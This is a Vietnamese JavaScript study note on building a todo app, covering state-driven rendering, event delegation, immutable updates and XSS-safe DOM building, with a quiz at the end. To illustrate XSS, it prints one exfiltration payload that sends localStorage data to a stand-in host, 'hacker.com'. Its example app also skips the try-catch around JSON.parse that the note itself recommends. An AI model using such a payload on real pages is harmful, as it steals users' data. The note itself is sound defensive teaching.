# Dự Án 03: Ứng Dụng Quản Lý Công Việc Chuẩn Doanh Nghiệp (Production Todo App)

## 1. Bản Đồ Liên Kết (Knowledge Links)
- **Kiến thức tiên quyết**:
  - [02-dom-manipulation-and-styles.md](file:///d:/my-project/revision-document/javascript/06-dom-and-web-apis/02-dom-manipulation-and-styles.md) (DOM Manipulation & XSS Defense).
  - [03-html-events-and-delegation.md](file:///d:/my-project/revision-document/javascript/06-dom-and-web-apis/03-html-events-and-delegation.md) (Event Delegation với `e.target.closest`).
- **Khái niệm tương quan**:
  - **State Driven Architecture**: Mọi thay đổi trên màn hình (thêm, xóa, gạch ngang, lọc) chỉ là hình chiếu (projection) từ mảng trạng thái thuần túy trong bộ nhớ JavaScript (`State -> View`).
  - **Optimistic UI vs Pessimistic UI**: Thao tác cập nhật giao diện trước ngay lập tức, nếu lưu LocalStorage/API lỗi thì mới Rollback trạng thái.
- **Điểm đến tiếp theo**:
  - [04-accessible-modal-dialog.md](file:///d:/my-project/revision-document/javascript/07-practical-projects/04-accessible-modal-dialog.md) (Hộp Thoại Modal Chuẩn Tiếp Cận).

---

## 2. Bản Chất Hoạt Động (Mental Model / Under the Hood)

### 2.1. Chu Trình Dữ Liệu Một Chiều (Unidirectional Data Flow)
Để tránh mã nguồn biến thành mớ "spaghetti code", ứng dụng Todo chuẩn doanh nghiệp tuân thủ luồng dữ liệu khép kín:

```
    [User Action] (Click check, Nhập phím Enter, Click xóa)
          |
          v
    [Event Listener] (Gắn trên container bằng Event Delegation)
          |
          v
    [Dispatch Action] (addTodo, toggleTodo, deleteTodo, setFilter)
          |
          v
    [Immutable Reducer] (Tạo mảng Todos mới, không mutate trực tiếp)
          |
          +---> [Persistent Layer] (Lưu chuỗi JSON vào LocalStorage)
          |
          v
    [Render Engine] (Biến đổi state thành các phần tử DOM đã escape XSS)
```

### 2.2. Kiểm Soát Bộ Nhớ Với Event Delegation
Thay vì gắn `addEventListener("click")` cho từng checkbox và nút xóa của hàng ngàn thẻ `<li>` (gây tiêu tốn bộ nhớ Heap):
- Chỉ gắn **1 listener duy nhất** lên thẻ danh sách cha `<ul>`.
- Dùng `const itemEl = e.target.closest("[data-id]")` để xác định chính xác công việc nào đang được tương tác.

### 2.3. Phòng Ngự Toàn Diện Chống Lỗ Hổng XSS (Cross-Site Scripting)
Khi người dùng nhập tiêu đề chứa mã độc JavaScript:
`<img src=x onerror="fetch('http://hacker.com?stolen=' + localStorage.getItem('todos'))">`
Nếu dùng `innerHTML = "<li>" + userInput + "</li>"`, đoạn script trên sẽ được trình duyệt thực thi ngay lập tức, gửi toàn bộ dữ liệu người dùng về máy chủ hacker.
Bắt buộc áp dụng một trong hai giải pháp:
1. Gán qua thuộc tính an toàn: `element.textContent = todo.title`.
2. Khử khuẩn chuỗi (Sanitize HTML Entities) trước khi nội suy chuỗi HTML.

---

## 3. Bẫy & Lỗi Kinh Điển (Common Pitfalls)

### Bẫy 1: Sửa Đổi Trực Tiếp Mảng (Mutation) Gây Lỗi Đồng Bộ Trạng Thái
```javascript
// ❌ SAI LẦM: Thay đổi trực tiếp thuộc tính của object cũ
function toggleTodo(todo) {
  todo.completed = !todo.completed; // Mutate! Rất khó debug trong ứng dụng lớn
}

// ✅ ĐÚNG: Cập nhật bất biến (Immutable Update) bằng map()
function toggleTodo(todos, id) {
  return todos.map(t => t.id === id ? { ...t, completed: !t.completed } : t);
}
```

### Bẫy 2: Parse Dữ Liệu `JSON.parse()` Từ LocalStorage Không Bắt Lỗi (Crash Ứng Dụng)
- Nếu người dùng hoặc tiện ích mở rộng can thiệp làm chuỗi trong LocalStorage bị sai cú pháp JSON (ví dụ `"{bad_json"`), lệnh `JSON.parse()` sẽ ném ra `SyntaxError` và làm sập toàn bộ ứng dụng web (màn hình trắng).
- Luôn bọc trong khối `try-catch` và kiểm tra kiểu dữ liệu mảng bằng `Array.isArray(parsed)`.

### Bẫy 3: Xung Đột Sự Kiện Click Checkbox & Sự Kiện Click Dòng
- Khi người dùng click vào nhãn văn bản của công việc, sự kiện bubble có thể vô tình kích hoạt cả thao tác chuyển trạng thái (toggle) và thao tác sửa (edit) nếu không phân định rõ `data-action` trên từng phần tử.

---

## 4. Code Thực Hành (Practical Examples)

Xem mã nguồn kiểm chứng toàn diện tại: [03-todo-app-demo.js](file:///d:/my-project/revision-document/javascript/07-practical-projects/03-todo-app-demo.js)

### Ứng Dụng Todo App Hoàn Chỉnh (Đủ CRUD, Filter, Storage, XSS Safe)
```html
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <title>Production Todo App</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      background: #0f172a;
      color: #f8fafc;
      display: flex;
      justify-content: center;
      padding: 3rem 1rem;
      margin: 0;
    }
    .app-card {
      background: #1e293b;
      width: 100%;
      max-width: 480px;
      padding: 2rem;
      border-radius: 16px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
    }
    .input-row {
      display: flex;
      gap: 0.5rem;
      margin-bottom: 1.5rem;
    }
    input[type="text"] {
      flex: 1;
      padding: 0.75rem 1rem;
      border-radius: 8px;
      border: 1px solid #475569;
      background: #0f172a;
      color: white;
      font-size: 1rem;
    }
    button.btn-add {
      background: #3b82f6;
      color: white;
      border: none;
      padding: 0.75rem 1.25rem;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
    }
    .todo-list {
      list-style: none;
      padding: 0;
      margin: 0;
    }
    .todo-item {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0.75rem;
      background: #334155;
      border-radius: 8px;
      margin-bottom: 0.5rem;
    }
    .todo-item.completed span {
      text-decoration: line-through;
      opacity: 0.5;
    }
    .btn-delete {
      background: #ef4444;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 0.35rem 0.6rem;
      cursor: pointer;
    }
    .footer-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 1.5rem;
      font-size: 0.875rem;
      color: #94a3b8;
    }
    .filter-btn {
      background: none;
      border: 1px solid #475569;
      color: #cbd5e1;
      padding: 0.25rem 0.5rem;
      border-radius: 4px;
      cursor: pointer;
    }
    .filter-btn.active {
      background: #3b82f6;
      color: white;
      border-color: #3b82f6;
    }
  </style>
</head>
<body>
  <div class="app-card">
    <h2>📝 Công Việc Cần Làm</h2>
    
    <div class="input-row">
      <input type="text" id="todo-input" placeholder="Bạn cần hoàn thành việc gì?" />
      <button id="btn-add" class="btn-add">Thêm</button>
    </div>

    <ul id="todo-list" class="todo-list"></ul>

    <div class="footer-bar">
      <span id="items-left">0 việc còn lại</span>
      <div>
        <button class="filter-btn active" data-filter="all">Tất cả</button>
        <button class="filter-btn" data-filter="active">Đang làm</button>
        <button class="filter-btn" data-filter="completed">Đã xong</button>
      </div>
      <button id="btn-clear" class="filter-btn">Xóa việc xong</button>
    </div>
  </div>

  <script>
    let todos = JSON.parse(localStorage.getItem("todos_db") || "[]");
    let currentFilter = "all";

    const input = document.getElementById("todo-input");
    const addBtn = document.getElementById("btn-add");
    const list = document.getElementById("todo-list");
    const itemsLeft = document.getElementById("items-left");
    const clearBtn = document.getElementById("btn-clear");

    function saveAndRender() {
      localStorage.setItem("todos_db", JSON.stringify(todos));
      
      const filtered = todos.filter(t => {
        if (currentFilter === "active") return !t.completed;
        if (currentFilter === "completed") return t.completed;
        return true;
      });

      // Render an toàn không lo XSS: Tạo DOM Elements hoặc escape text
      list.innerHTML = "";
      const fragment = document.createDocumentFragment();

      filtered.forEach(todo => {
        const li = document.createElement("li");
        li.className = `todo-item ${todo.completed ? "completed" : ""}`;
        li.dataset.id = todo.id;

        const label = document.createElement("label");
        label.style.display = "flex";
        label.style.alignItems = "center";
        label.style.gap = "0.75rem";
        label.style.cursor = "pointer";

        const chk = document.createElement("input");
        chk.type = "checkbox";
        chk.checked = todo.completed;
        chk.dataset.action = "toggle";

        const textSpan = document.createElement("span");
        textSpan.textContent = todo.title; // An toàn tuyệt đối chống XSS!

        label.append(chk, textSpan);

        const delBtn = document.createElement("button");
        delBtn.className = "btn-delete";
        delBtn.textContent = "Xóa";
        delBtn.dataset.action = "delete";

        li.append(label, delBtn);
        fragment.append(li);
      });

      list.append(fragment);
      itemsLeft.textContent = `${todos.filter(t => !t.completed).length} việc còn lại`;
    }

    function addTodo() {
      const text = input.value.trim();
      if (!text) return;
      todos.unshift({ id: String(Date.now()), title: text, completed: false });
      input.value = "";
      saveAndRender();
    }

    addBtn.addEventListener("click", addTodo);
    input.addEventListener("keydown", (e) => {
      if (e.key === "Enter") addTodo();
    });

    // Event Delegation trên danh sách thẻ ul
    list.addEventListener("click", (e) => {
      const target = e.target;
      const li = target.closest("li");
      if (!li) return;
      const id = li.dataset.id;

      if (target.dataset.action === "toggle") {
        todos = todos.map(t => t.id === id ? { ...t, completed: !t.completed } : t);
        saveAndRender();
      } else if (target.dataset.action === "delete") {
        todos = todos.filter(t => t.id !== id);
        saveAndRender();
      }
    });

    clearBtn.addEventListener("click", () => {
      todos = todos.filter(t => !t.completed);
      saveAndRender();
    });

    // Lọc sự kiện
    document.querySelector(".footer-bar").addEventListener("click", (e) => {
      if (e.target.dataset.filter) {
        document.querySelectorAll(".filter-btn").forEach(b => b.classList.remove("active"));
        e.target.classList.add("active");
        currentFilter = e.target.dataset.filter;
        saveAndRender();
      }
    });

    saveAndRender();
  </script>
</body>
</html>
```

---

## 5. Câu Hỏi Tự Kiểm Tra (Self-Test Quiz)

### Câu 1: Tại sao việc sử dụng `document.createElement` kèm `textContent` lại an toàn tuyệt đối trước các đợt tấn công XSS so với `innerHTML`?
<details>
<summary><b>Lời giải chi tiết</b></summary>

- Khi gán chuỗi qua `innerHTML`, trình duyệt buộc phải gọi bộ phân tích cú pháp HTML Parser của C++. Nếu chuỗi chứa các thẻ HTML độc hại (`<script>`, `<img onerror=...>`, `<iframe src=...>`), parser sẽ biên dịch và cho phép trình duyệt thực thi đoạn mã độc đó trong ngữ cảnh phiên người dùng hiện tại.
- Khi gán qua `element.textContent`, trình duyệt coi chuỗi đó **100% là văn bản thuần túy (Raw Text String)**. Toàn bộ các ký tự nhạy cảm như `<` và `>` được xử lý trực tiếp như các ký tự hiển thị mà không bao giờ kích hoạt HTML Parser, triệt tiêu 100% khả năng bị tấn công XSS.
</details>

### Câu 2: Trong kiến trúc Todo App, tại sao việc tạo ID bằng `Date.now()` đơn thuần có thể dẫn đến bug tiềm ẩn khi thêm công việc tự động qua vòng lặp?
<details>
<summary><b>Lời giải chi tiết</b></summary>

- `Date.now()` trả về số mili-giây từ thời điểm Unix Epoch. Trong môi trường máy tính hiện đại, các vòng lặp xử lý có thể tạo ra hàng chục bản ghi trong cùng **1 mili-giây**, dẫn đến nhiều phần tử trùng hệt nhau về `id`.
- Khi các phần tử bị trùng `id`, các thao tác `toggleTodo` hay `deleteTodo` sẽ xóa nhầm hoặc toggle nhầm hàng loạt công việc cùng lúc.
- **Giải pháp chuẩn**: Kết hợp `Date.now() + "_" + Math.random().toString(36).substring(2, 9)` hoặc sử dụng hàm chuẩn Web Crypto API: `crypto.randomUUID()`.
</details>
